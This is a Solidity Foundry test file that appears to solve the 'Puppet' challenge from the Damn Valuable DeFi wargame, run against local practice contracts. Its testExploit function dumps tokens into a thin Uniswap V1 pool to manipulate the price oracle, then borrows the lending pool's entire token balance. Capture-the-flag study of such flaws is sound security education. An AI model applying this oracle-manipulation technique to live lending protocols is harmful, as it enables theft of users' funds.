// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function display() public view {
        uint256 DECIMAL = 1;
        console.log();
        console.log(
            "Uniswap balance in ETH =",
            address(uniswapExchange).balance / DECIMAL
        );
        console.log(
            "Uniswap balance in token =",
            dvt.balanceOf(address(uniswapExchange)) / DECIMAL
        );
        console.log(
            "PuppetPool balance in ETH =",
            address(puppetPool).balance / DECIMAL
        );
        console.log(
            "PuppetPool balance in token =",
            dvt.balanceOf(address(puppetPool)) / DECIMAL
        );
        console.log("Attacker balance in ETH =", attacker.balance / DECIMAL);
        console.log(
            "Attacker balance in token =",
            dvt.balanceOf(attacker) / DECIMAL
        );
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        display();
        console.log(
            "Oracle prize for token 1000 =",
            (address(uniswapExchange).balance * (10**18)) /
                dvt.balanceOf(address(uniswapExchange))
        );
        uint256 token_balance = dvt.balanceOf(attacker);
        console.log(
            "Token to Eth prize =",
            calculateTokenToEthInputPrice(
                token_balance,
                dvt.balanceOf(address(uniswapExchange)),
                address(uniswapExchange).balance
            )
        );
        dvt.approve(address(uniswapExchange), token_balance);
        uniswapExchange.tokenToEthSwapInput(
            token_balance,
            1,
            block.timestamp + 1000
        );
        uint256 val = uniswapExchange.getTokenToEthInputPrice(token_balance);
        console.log("val = ", val);

        uint256 depositReq = puppetPool.calculateDepositRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );
        console.log("Deposit Required =", depositReq);
        console.log(
            "Token to Eth prize =",
            calculateTokenToEthInputPrice(
                token_balance,
                dvt.balanceOf(address(uniswapExchange)),
                address(uniswapExchange).balance
            )
        );

        console.log(
            "Oracle prize for token 1000 =",
            (address(uniswapExchange).balance * (10**18)) /
                dvt.balanceOf(address(uniswapExchange))
        );
        puppetPool.borrow{value: 25 ether}(POOL_INITIAL_TOKEN_BALANCE);
        display();
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
